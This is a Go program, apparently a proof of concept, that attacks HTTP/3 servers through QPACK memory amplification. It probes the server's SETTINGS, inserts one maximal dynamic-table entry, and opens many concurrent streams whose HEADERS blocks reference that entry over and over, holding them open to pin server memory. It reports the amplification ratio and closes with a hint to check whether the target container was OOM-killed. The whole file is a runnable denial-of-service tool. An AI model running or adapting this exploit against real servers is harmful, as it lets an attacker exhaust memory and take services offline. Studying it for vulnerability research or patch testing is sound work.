package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
	"golang.org/x/net/http2/hpack"
)

func main() {
	target := flag.String("target", "127.0.0.1:443", "Target host:port")
	authority := flag.String("authority", "localhost", "HTTP/3 :authority")
	conns := flag.Int("conns", 10, "Concurrent connections")
	streams := flag.Int("streams", 100, "Streams per connection")
	capacity := flag.Uint64("capacity", 4096, "QPACK dynamic table capacity")
	hold := flag.Duration("hold", 12*time.Second, "Hold duration after sending")
	noFin := flag.Bool("no-fin", true, "Keep streams open to pin memory")
	blocks := flag.Int("blocks", 8, "HEADERS blocks per stream")
	probeOnly := flag.Bool("probe", false, "Probe server SETTINGS and exit")
	flag.Parse()

	hostname := *authority
	if i := strings.LastIndex(hostname, ":"); i >= 0 {
		hostname = hostname[:i]
	}

	settings, err := probeSettings(*target, hostname)
	if err != nil {
		log.Printf("settings probe failed: %v", err)
	} else {
		fmt.Printf("QPACK_MAX_TABLE_CAPACITY: %d\n", settings.maxTableCap)
		fmt.Printf("MAX_HEADER_LIST_SIZE:     %d\n", settings.maxHeaderList)
		fmt.Printf("QPACK_BLOCKED_STREAMS:    %d\n", settings.blockedStreams)
		if settings.maxTableCap > 0 && settings.maxTableCap < *capacity {
			*capacity = settings.maxTableCap
		}
	}

	if *probeOnly {
		return
	}

	if *capacity == 0 {
		log.Fatal("server disabled qpack dynamic table")
	}

	const nameLen = 22
	const overhead = 32
	valueLen := int(*capacity) - nameLen - overhead
	if valueLen <= 0 {
		log.Fatalf("capacity %d too small", *capacity)
	}

	refCount := 15
	entrySize := nameLen + valueLen

	encoderPayload := buildEncoderPayload(*capacity, 61, valueLen)
	singleBlock := buildHeadersFrame(*authority, refCount)

	var streamPayload []byte
	for range *blocks {
		streamPayload = append(streamPayload, singleBlock...)
	}

	totalStreams := *conns * *streams
	allocPerStream := refCount * entrySize * *blocks
	totalWire := len(encoderPayload)*(*conns) + len(streamPayload)*totalStreams

	fmt.Printf("conns=%d streams=%d blocks=%d entry=%dB refs=%d\n",
		*conns, *streams, *blocks, entrySize, refCount)
	fmt.Printf("alloc/stream=%dB total=%.1fMB wire=%.1fKB amp=%.0fx\n",
		allocPerStream,
		float64(totalStreams*allocPerStream)/(1024*1024),
		float64(totalWire)/1024,
		float64(totalStreams*allocPerStream)/float64(totalWire))

	var wg sync.WaitGroup
	for c := range *conns {
		wg.Add(1)
		go func() {
			defer wg.Done()
			runConn(c, *target, hostname, encoderPayload, streamPayload, *streams, *hold, *noFin)
		}()
	}
	wg.Wait()
	fmt.Println("done, check: docker inspect --format='{{.State.OOMKilled}}' <container>")
}

func runConn(id int, target, hostname string, encPayload, streamPayload []byte, numStreams int, hold time.Duration, noFin bool) {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
		ServerName:         hostname,
	}
	conn, err := quic.DialAddr(context.Background(), target, tlsConf, &quic.Config{
		MaxIdleTimeout:  30 * time.Second,
		KeepAlivePeriod: 5 * time.Second,
	})
	if err != nil {
		log.Printf("conn %d: dial: %v", id, err)
		return
	}
	defer conn.CloseWithError(0, "done")

	enc, err := initH3(conn)
	if err != nil {
		log.Printf("conn %d: h3 init: %v", id, err)
		return
	}

	if _, err := enc.Write(encPayload); err != nil {
		log.Printf("conn %d: enc write: %v", id, err)
		return
	}
	time.Sleep(50 * time.Millisecond)

	var wg sync.WaitGroup
	for range numStreams {
		wg.Add(1)
		go func() {
			defer wg.Done()
			stream, err := conn.OpenStream()
			if err != nil {
				return
			}
			if _, err := stream.Write(streamPayload); err != nil {
				stream.Close()
				return
			}
			if noFin {
				time.Sleep(hold)
			} else {
				stream.Close()
			}
		}()
	}
	wg.Wait()
	log.Printf("conn %d: %d streams done", id, numStreams)
}

func initH3(conn *quic.Conn) (*quic.SendStream, error) {
	ctrl, err := conn.OpenUniStream()
	if err != nil {
		return nil, err
	}
	var buf []byte
	buf = append(buf, quicVarint(0x00)...)
	buf = append(buf, quicVarint(0x04)...)
	buf = append(buf, quicVarint(0x00)...)
	if _, err := ctrl.Write(buf); err != nil {
		return nil, err
	}

	enc, err := conn.OpenUniStream()
	if err != nil {
		return nil, err
	}
	if _, err := enc.Write(quicVarint(0x02)); err != nil {
		return nil, err
	}

	dec, err := conn.OpenUniStream()
	if err != nil {
		return nil, err
	}
	if _, err := dec.Write(quicVarint(0x03)); err != nil {
		return nil, err
	}

	return enc, nil
}

func buildEncoderPayload(capacity uint64, staticIdx uint64, valueLen int) []byte {
	var buf bytes.Buffer
	buf.Write(qpackVarint(capacity, 5, 0x20))
	buf.Write(qpackVarint(staticIdx, 6, 0xC0))
	value := strings.Repeat("a", valueLen)
	huffLen := hpack.HuffmanEncodeLength(value)
	buf.Write(qpackVarint(huffLen, 7, 0x80))
	buf.Write(hpack.AppendHuffmanString(nil, value))
	return buf.Bytes()
}

func buildHeadersFrame(authority string, refCount int) []byte {
	var fs bytes.Buffer
	fs.Write(qpackVarint(2, 8, 0x00))
	fs.Write(qpackVarint(0, 7, 0x00))
	fs.Write(qpackVarint(17, 6, 0xC0))
	fs.Write(qpackVarint(23, 6, 0xC0))
	fs.Write(qpackVarint(1, 6, 0xC0))
	fs.Write(qpackVarint(0, 4, 0x50))
	fs.Write(qpackVarint(uint64(len(authority)), 7, 0x00))
	fs.WriteString(authority)

	for range refCount {
		fs.Write(qpackVarint(0, 6, 0x80))
	}

	payload := fs.Bytes()
	var frame bytes.Buffer
	frame.Write(quicVarint(0x01))
	frame.Write(quicVarint(uint64(len(payload))))
	frame.Write(payload)
	return frame.Bytes()
}

type h3Settings struct {
	maxTableCap    uint64
	maxHeaderList  uint64
	blockedStreams uint64
}

func probeSettings(target, hostname string) (*h3Settings, error) {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
		ServerName:         hostname,
	}
	conn, err := quic.DialAddr(context.Background(), target, tlsConf, &quic.Config{MaxIdleTimeout: 10 * time.Second})
	if err != nil {
		return nil, err
	}
	defer conn.CloseWithError(0, "probe")
	if _, err := initH3(conn); err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	for {
		stream, err := conn.AcceptUniStream(ctx)
		if err != nil {
			return nil, err
		}
		r := &byteReader{s: stream}
		stype, err := readVarint(r)
		if err != nil || stype != 0x00 {
			continue
		}
		ftype, err := readVarint(r)
		if err != nil || ftype != 0x04 {
			return nil, fmt.Errorf("expected SETTINGS frame")
		}
		flen, err := readVarint(r)
		if err != nil {
			return nil, err
		}
		payload := make([]byte, flen)
		if _, err := io.ReadFull(stream, payload); err != nil {
			return nil, err
		}
		return parseSettings(payload), nil
	}
}

func parseSettings(p []byte) *h3Settings {
	s := &h3Settings{}
	r := bytes.NewReader(p)
	for r.Len() > 0 {
		id, err := readVarint(r)
		if err != nil {
			break
		}
		val, err := readVarint(r)
		if err != nil {
			break
		}
		switch id {
		case 0x01:
			s.maxTableCap = val
		case 0x06:
			s.maxHeaderList = val
		case 0x07:
			s.blockedStreams = val
		}
	}
	return s
}

func qpackVarint(n uint64, prefixBits int, mask byte) []byte {
	max := uint64((1 << prefixBits) - 1)
	if n < max {
		return []byte{mask | byte(n)}
	}
	buf := []byte{mask | byte(max)}
	n -= max
	for n >= 128 {
		buf = append(buf, byte(n%128)|0x80)
		n /= 128
	}
	buf = append(buf, byte(n))
	return buf
}

func quicVarint(v uint64) []byte {
	switch {
	case v < 64:
		return []byte{byte(v)}
	case v < 16384:
		return []byte{byte((v >> 8) | 0x40), byte(v)}
	case v < 1073741824:
		return []byte{byte((v >> 24) | 0x80), byte(v >> 16), byte(v >> 8), byte(v)}
	default:
		return []byte{
			byte((v >> 56) | 0xc0), byte(v >> 48), byte(v >> 40), byte(v >> 32),
			byte(v >> 24), byte(v >> 16), byte(v >> 8), byte(v),
		}
	}
}

type byteReader struct {
	s   *quic.ReceiveStream
	buf [1]byte
}

func (b *byteReader) ReadByte() (byte, error) {
	_, err := io.ReadFull(b.s, b.buf[:])
	return b.buf[0], err
}

func readVarint(r io.ByteReader) (uint64, error) {
	b, err := r.ReadByte()
	if err != nil {
		return 0, err
	}
	val := uint64(b & 0x3f)
	n := 0
	switch b >> 6 {
	case 1:
		n = 1
	case 2:
		n = 3
	case 3:
		n = 7
	}
	for range n {
		b, err = r.ReadByte()
		if err != nil {
			return 0, err
		}
		val = (val << 8) | uint64(b)
	}
	return val, nil
}
